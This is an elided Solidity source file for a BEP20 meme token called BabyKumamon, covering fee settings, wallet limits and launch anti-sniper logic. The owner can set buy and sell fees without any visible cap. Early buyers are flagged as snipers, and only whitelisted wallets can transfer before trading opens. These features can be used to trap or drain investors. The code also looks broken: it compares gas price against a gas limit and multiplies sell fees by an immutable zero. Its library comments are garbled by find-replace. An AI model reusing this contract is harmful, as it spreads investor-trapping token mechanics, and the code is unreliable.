...
interface IERC20 {
	 ...
	 * This allows applications to reconstruct the allowance for all BabyKumamon just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also BabyKumamoned.
	...
	// File: contracts/BabyKumamonBEP20PayingToken.sol
	...
	// File: contracts/BabyKumamon.sol
	...
	contract BabyKumamon is ERC20, Ownable {
        ...
        address payable public marketingFeeReceiver = payable(0x1d8E86c5415D3174aE0f88AAD260f4bb26D16777); 
		address payable public buyBackFeeReceiver = payable(0x0d81a222f0C51124489Aca5a0383e144e0F41050); 

		
        // Transaction Limit
		uint256 public maxTxAmount = 10000000000000 * (10**9); 
		uint256 public maxWalletSize = 50000000000000 * (10**9);
		...
		uint256 private BPBlock = 2;
		uint256 private BPGasLimit = 5000000;
        uint256 private launchedAt;
		uint256 private immutable BPBlockFeeIncrease = 0;
		...
		event excludeMultipleAccountFromRewards(address[] BabyKumamon, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private _BPValue = 1000000000000000 * (10**18); 
		...
		constructor() ERC20("BabyKumamon", "KUMAMON"){
			uint256 _buyBackFeeBuy = 1;
			uint256 _liquidityFeeBuy = 1;
			uint256 _marketingFeeBuy = 2;
			uint256 _taxFeeBuy = 1;
			uint256 _buyBackFeeSell = 2;
			uint256 _liquidityFeeSell = 3;
			uint256 _marketingFeeSell = 4;
			uint256 _taxFeeSell = 3;
			...
			totalFeeBuy = _buyBackFeeBuy + _liquidityFeeBuy + _marketingFeeBuy + _taxFeeBuy;
			totalFeeSell = _buyBackFeeSell + _liquidityFeeSell + _marketingFeeSell + _taxFeeSell;
			...
			emit SetIsFeeExempt(address(0x0d81a222f0C51124489Aca5a0383e144e0F41050), true);

			// enable owner and fixed-sale wallet to send tokens before presales are over
			canTransferBeforeswapEnabled[owner()] = true;
			canTransferBeforeswapEnabled[0x0d81a222f0C51124489Aca5a0383e144e0F41050] = true;
			/*
		...
		function setIsFeeExempt(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "BabyKumamon: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function setIsTxLimitExempt(address account, bool excluded) public onlyOwner {
			require(_isTxLimit[account] != excluded, "BabyKumamon: Account is already the value of 'excluded'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "BabyKumamon: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "BabyKumamon: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "BabyKumamon: The liquidity wallet is already this address");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "BabyKumamon: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "BabyKumamon: Cannot update distributorGas to same value");
		...
		// Set our buy fees
        function setBuyFees (uint256 _liquidityFeeBuy, uint256 _marketingFeeBuy, uint256 _buyBackFeeBuy, uint256 _taxFeeBuy, uint256 _feeDenominator) external onlyOwner {
            liquidityFeeBuy = _liquidityFeeBuy;
            marketingFeeBuy = _marketingFeeBuy;
            buyBackFeeBuy = _buyBackFeeBuy;
			taxFeeBuy = _taxFeeBuy;
		 ...
		 // Set our sell fees
		function setSellFees ( uint256 _liquidityFeeSell, uint256 _marketingFeeSell, uint256 _buyBackFeeSell, uint256 _taxFeeSell, uint256 _feeDenominator) external onlyOwner {
			liquidityFeeSell = _liquidityFeeSell;
            marketingFeeSell = _marketingFeeSell;
            buyBackFeeSell = _buyBackFeeSell;
			taxFeeSell = _taxFeeSell;
        ...
        function setBPEnabled (uint256 _BPBlock, uint256 _BPGasLimit) external onlyOwner {
            BPBlock = _BPBlock;
			BPGasLimit = _BPGasLimit;
		...
		function _transfer(
			...
			if (block.number <= launchedAt + BPBlock && tx.gasprice <= BPGasLimit) {
                _isSniper[to] = true;
			...
			if(!tradingOpen) {
				require(canTransferBeforeswapEnabled[from], "BabyKumamon: This account cannot send tokens until trading is enabled");
			}
			...
			if( 
				...
				require(amount <= _BPValue, "address 100%.");
			}
			...
			if(takeFee) {
				...
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(BPBlockFeeIncrease).div(100);
				}
